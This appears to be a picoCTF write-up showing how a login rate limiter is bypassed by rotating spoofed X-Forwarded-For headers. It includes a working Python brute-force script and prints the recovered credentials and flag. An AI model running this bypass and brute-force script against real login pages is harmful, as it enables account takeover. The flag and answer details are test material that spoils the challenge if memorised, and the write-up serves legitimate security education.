
---

## CTF Writeup: Fool That Limiter (Web Exploitation)

### Challenge Overview

The challenge presented a login page that was protected by a **Rate Limiter**. After 10 failed login attempts, the server would block the user's IP address and return a `429 Too Many Requests` or a custom "Rate Limited Exceeded" message. To find the correct credentials, a brute-force attack was required, but the rate limit had to be bypassed.

### Vulnerability Analysis

The application likely used a reverse proxy (like Nginx or a Load Balancer) to track user IPs. Many applications trust specific HTTP headers to identify the "real" client IP behind a proxy. If the server is misconfigured to trust these headers from any source, an attacker can **spoof** their IP address by modifying:

- `X-Forwarded-For`
    
- `X-Real-IP`
    
- `Client-IP`
    

### The Strategy

1. **Credential Dumping**: We had a list of 100 potential username/password pairs.
    
2. **IP Spoofing**: Use a list of 600+ fake IPs to rotate the `X-Forwarded-For` header for every request.
    
3. **Automation**: Write a Python script to iterate through the credentials and IPs simultaneously.
    
4. **Error Handling**: If the server detected the real IP and blocked it, the script would catch the "Rate Limited" message and pause (`time.sleep`) to allow the lockout to reset.
    

### The Exploit (Python)

We used the `requests` library to automate the POST requests. The script synchronized three files: `user.txt`, `pass.txt`, and `ip.txt`.

Python

```
import requests
import time

TARGET_URL = "http://candy-mountain.picoctf.net:55892"
LOGIN_URL = f"{TARGET_URL}/login"

# Load files
with open("user.txt", "r") as u, open("pass.txt", "r") as p, open("ip.txt", "r") as i:
    creds = list(zip([line.strip() for line in u], [line.strip() for line in p]))
    ips = [line.strip() for line in i]

for idx, (user, pwd) in enumerate(creds):
    current_ip = ips[idx % len(ips)]
    headers = {"X-Forwarded-For": current_ip, "User-Agent": "Mozilla/5.0"}
    
    resp = requests.post(LOGIN_URL, data={"username": user, "password": pwd}, 
                         headers=headers, allow_redirects=False)

    # Success Check
    if resp.status_code == 302:
        print(f"Success! Found: {user}:{pwd}")
        break
    
    # Rate Limit Recovery
    if "Rate Limited" in resp.text:
        print(f"Blocked at {user}. Waiting 10s...")
        time.sleep(10)
```

### Execution & Results

While running the script, the server occasionally bypassed the fake headers and blocked the actual Kali Linux IP. However, the **10-second sleep timer** allowed the cooldown period to pass, and the script continued the brute force.

- **Correct Credentials Found**: `nadir:vides`
    
- **Flag**: `picoCTF{f00l_7h4t_l1m1t3r_9ea694c6}`
    

### Conclusion

This challenge demonstrates that rate limiting based solely on client-provided headers is insecure. Developers should implement rate limiting at the network layer or use more robust session-based tracking to prevent IP spoofing attacks.

---
_Writeup by: obito | picoCTF 2026_
